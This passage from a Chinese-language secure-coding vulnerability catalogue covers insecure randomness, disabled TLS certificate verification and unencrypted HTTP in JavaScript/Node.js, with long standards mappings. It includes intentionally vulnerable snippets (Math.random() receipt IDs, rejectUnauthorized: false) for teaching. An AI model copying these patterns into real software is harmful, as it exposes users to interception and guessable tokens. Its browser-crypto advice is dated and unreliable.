<p>[8] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.3 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.7 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.10 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.10 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.10 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.10 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Randomness"><a href="#Insecure-Randomness" class="headerlink" title="Insecure Randomness"></a>Insecure Randomness</h4><h5 id="ABSTRACT-56"><a href="#ABSTRACT-56" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>标准的伪随机数值生成器不能抵挡各种加密攻击。</p>
<h5 id="EXPLANATION-56"><a href="#EXPLANATION-56" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在对安全性要求较高的环境中，使用能够生成可预测值的函数作为随机数据源，会产生 Insecure Randomness 错误。</p>
<p>电脑是一种具有确定性的机器，因此不可能产生真正的随机性。伪随机数生成器 (PRNG) 近似于随机算法，始于一个能计算后续数值的种子。</p>
<p>PRNG 包括两种类型：统计学的 PRNG 和密码学的 PRNG。统计学的 PRNG 提供很多有用的统计属性，但其输出结果很容易预测，因此容易复制数值流。在安全性所依赖的生成值不可预测的情况下，这种类型并不适用。密码学的 PRNG 生成的输出结果较难预测，可解决这一问题。为保证值的加密安全性，必须使攻击者根本无法、或几乎不可能鉴别生成的随机值和真正的随机值。通常情况下，如果并未声明 PRNG 算法带有加密保护，那么它很可能就是统计学的 PRNG，因此不应在对安全性要求较高的环境中使用，否则会导致严重的漏洞（如易于猜测的密码、可预测的加密密钥、Session Hijacking 和 DNS Spoofing）。</p>
<p>示例： 下面的代码可利用统计学的 PRNG 为购买产品后仍在有效期内的收据创建一个 URL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function genReceiptURL (baseURL)&#123;</span><br><span class="line"></span><br><span class="line">  var randNum = Math.random();</span><br><span class="line"></span><br><span class="line">  var receiptURL = baseURL + randNum + &quot;.html&quot;;</span><br><span class="line"></span><br><span class="line">  return receiptURL;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码使用 Math.random() 函数为它生成的收据页面生成“唯一”的标识符。由于 Math.random() 是统计学的 PRNG，攻击者很容易猜到其生成的字符串。尽管收据系统的底层设计并不完善，但若使用不会生成可预测收据标识符的随机数生成器（如密码学的 PRNG），就会更安全些。</p>
<h5 id="RECOMMENDATIONS-56"><a href="#RECOMMENDATIONS-56" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>当不可预测性至关重要时，如大多数对安全性要求较高的环境都采用随机性，这时可以使用密码学的 PRNG。不管选择了哪一种 PRNG，都要始终使用带有充足熵的数值作为该算法的种子。（切勿使用诸如当前时间之类的数值，因为它们只提供很小的熵。）</p>
<p>在 JavaScript 中，常规的建议是使用 Mozilla API 中的 window.crypto.random() 函数。但这种方法在多种浏览器中都不起作用，包括 Mozilla Firefox 的最新版本。目前没有适用于功能强大的密码学 PRNG 的跨浏览器解决方案。此时应考虑在 JavaScript 之外处理任意 PRNG 功能。</p>
<h5 id="REFERENCES-55"><a href="#REFERENCES-55" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] J. Viega, G. McGraw Building Secure Software Addison-Wesley</p>
<p>[2] JavaScript crypto: window.crypto.random() Mozilla</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 338 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002450 </p>
<p>[5] Standards Mapping - FIPS200 MP </p>
<p>[6] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-13 Cryptographic Protection (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.3.1 Authenticator Lifecycle Requirements, 2.6.2 Look-up Secret Verifier Requirements, 3.2.2 Session Binding Requirements, 3.2.4 Session Binding Requirements, 6.3.1 Random Values, 6.3.2 Random Values, 6.3.3 Random Values </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M6 Broken Cryptography </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.3 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.3 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.3 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.3 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.3 </p>
<p>[20] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.3 - Use of Cryptography </p>
<p>[21] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 330 </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3150.2 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3150.2 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3150.2 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3150.2 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3150.2 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3150.2 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3150.2 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002010 CAT II, APSC-DV-002050 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002010 CAT II, APSC-DV-002050 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002010 CAT II, APSC-DV-002050 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002010 CAT II, APSC-DV-002050 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002010 CAT II, APSC-DV-002050 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002010 CAT II, APSC-DV-002050 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002010 CAT II, APSC-DV-002050 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002010 CAT II, APSC-DV-002050 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002010 CAT II, APSC-DV-002050 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002010 CAT II, APSC-DV-002050 CAT II </p>
<h4 id="Insecure-SSL-Server-Identity-Verification-Disabled"><a href="#Insecure-SSL-Server-Identity-Verification-Disabled" class="headerlink" title="Insecure SSL: Server Identity Verification Disabled"></a>Insecure SSL: Server Identity Verification Disabled</h4><h5 id="ABSTRACT-57"><a href="#ABSTRACT-57" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>当进行 SSL 连接时，服务器身份验证处于禁用状态。</p>
<h5 id="EXPLANATION-57"><a href="#EXPLANATION-57" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在某些使用 SSL 连接的库中，默认情况下不验证服务器证书。这相当于信任所有证书。</p>
<p>示例 1：此服务器错误地尝试验证客户端连接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var options = &#123;</span><br><span class="line"></span><br><span class="line">  key : fs.readFileSync(&apos;my-server-key.pem&apos;),</span><br><span class="line"></span><br><span class="line">  cert : fs.readFileSync(&apos;server-cert.pem&apos;),</span><br><span class="line"></span><br><span class="line">  requestCert: true,</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https.createServer(options);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>创建 https.Server 对象时，requestCert 设置会指定为 true，但未设置 rejectUnauthorized，其默认设置为 false。这意味着尽管服务器是为了通过 SSL 验证客户端而创建，但即使未使用提供的 CA 列表对证书进行授权，也仍然会接受连接。</p>
<p>示例 2：此应用程序尝试通过 SSL 连接到服务器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var tls = require(&apos;tls&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">tls.connect(&#123;</span><br><span class="line"></span><br><span class="line">  host: &apos;https://www.hackersite.com&apos;,</span><br><span class="line"></span><br><span class="line">  port: &apos;443&apos;,</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  rejectUnauthorized: false,</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>在此示例中，如果 rejectUnauthorized 设置为 false，这意味着将接受未经授权的证书，并且仍然会与无法识别的服务器建立安全连接。此时，当服务器被黑客攻击发生 SSL 连接中断时，应用程序可能会泄漏用户敏感信息。</p>
<h5 id="RECOMMENDATIONS-57"><a href="#RECOMMENDATIONS-57" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>当进行 SSL 连接时，不要忘记服务器验证检查。根据所使用的库，一定要验证服务器身份并建立安全的 SSL 连接。</p>
<p>示例 3：此代码实现的功能与Example 1 相同，但会确保拒绝未经验证的客户端，而不仅仅是将连接标记为来自无法识别的客户端：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var options = &#123;</span><br><span class="line"></span><br><span class="line">  key : fs.readFileSync(&apos;my-server-key.pem&apos;),</span><br><span class="line"></span><br><span class="line">  cert : fs.readFileSync(&apos;server-cert.pem&apos;),</span><br><span class="line"></span><br><span class="line">  requestCert: true,</span><br><span class="line"></span><br><span class="line">  rejectUnauthorized: true,</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https.createServer(options);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-56"><a href="#REFERENCES-56" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 297 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287, [25] CWE ID 295 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000185, CCI-001941, CCI-001942, CCI-002418, CCI-002420, CCI-002421, CCI-002422 </p>
<p>[4] Standards Mapping - FIPS200 CM, SC </p>
<p>[5] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 3.7.1 Defenses Against Session Management Exploits, 6.2.1 Algorithms, 9.2.1 Server Communications Security Requirements, 9.2.3 Server Communications Security Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A3 Broken Authentication and Session Management </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 4.1, Requirement 6.5.4 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.2 - Sensitive Data Protection, Control Objective 7.1 - Use of Cryptography </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001810 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001810 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001810 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001810 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001810 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001810 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001810 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001810 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001810 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-001810 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[39] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04) </p>
<h4 id="Insecure-Transport"><a href="#Insecure-Transport" class="headerlink" title="Insecure Transport"></a>Insecure Transport</h4><h5 id="ABSTRACT-58"><a href="#ABSTRACT-58" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该调用会使用未加密的协议（而非加密的协议）与服务器通信。</p>
<h5 id="EXPLANATION-58"><a href="#EXPLANATION-58" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>所有利用 HTTP、FTP 或 Gopher 的通信均未经过身份验证和加密。因此可能面临风险，特别是在移动环境中，设备要利用 WiFi 连接来频繁连接不安全的公共无线网络。</p>
<p>示例 1：以下示例通过 HTTP 协议（而不是 HTTPS 协议）读取数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.request(options, function(res)&#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>由于传入的 http.IncomingMessage 对象 res 通过未加密和未经验证的通道传输，因而可能存在安全隐患。</p>
<h5 id="RECOMMENDATIONS-58"><a href="#RECOMMENDATIONS-58" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应尽可能使用 HTTPS 等安全协议与服务器交换数据。</p>
<h5 id="REFERENCES-57"><a href="#REFERENCES-57" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Designing for Security Android</p>
<p>[2] S. Fahl, M. Harbach, T. Muders, M. Smith, L. Baumgartner, B. Friesleben Why Eve and Mallory Love Android:An Analysis of Android SSL (In)Security </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 319 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000068, CCI-001453, CCI-002418, CCI-002420, CCI-002421, CCI-002422, CCI-002890, CCI-003123 </p>
<p>[5] Standards Mapping - FIPS200 SC </p>
<p>[6] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.9.1 Communications Architectural Requirements, 1.14.1 Configuration Architectural Requirements, 2.2.5 General Authenticator Requirements, 2.6.3 Look-up Secret Verifier Requirements, 2.8.3 Single or Multi Factor One Time Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.9.3 Cryptographic Software and Devices Verifier Requirements, 3.7.1 Defenses Against Session Management Exploits, 6.2.1 Algorithms, 6.2.2 Algorithms, 6.2.3 Algorithms, 6.2.4 Algorithms, 6.2.5 Algorithms, 6.2.6 Algorithms, 6.2.7 Algorithms, 8.1.6 General Data Protection, 8.3.1 Sensitive Private Data, 8.3.4 Sensitive Private Data, 8.3.7 Sensitive Private Data, 9.1.1 Communications Security Requirements, 9.1.2 Communications Security Requirements, 9.1.3 Communications Security Requirements, 9.2.1 Server Communications Security Requirements, 9.2.2 Server Communications Security Requirements, 9.2.3 Server Communications Security Requirements, 14.1.3 Build, 14.4.5 HTTP Security Headers Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 4.1, Requirement 6.5.4 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 6.2 - Sensitive Data Protection, Control Objective 7 - Use of Cryptography </p>
<p>[23] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319 </p>
<p>[24] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311 </p>
<p>[25] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311 </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000160 CAT II, APSC-DV-000170 CAT II, APSC-DV-001940 CAT II, APSC-DV-001950 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
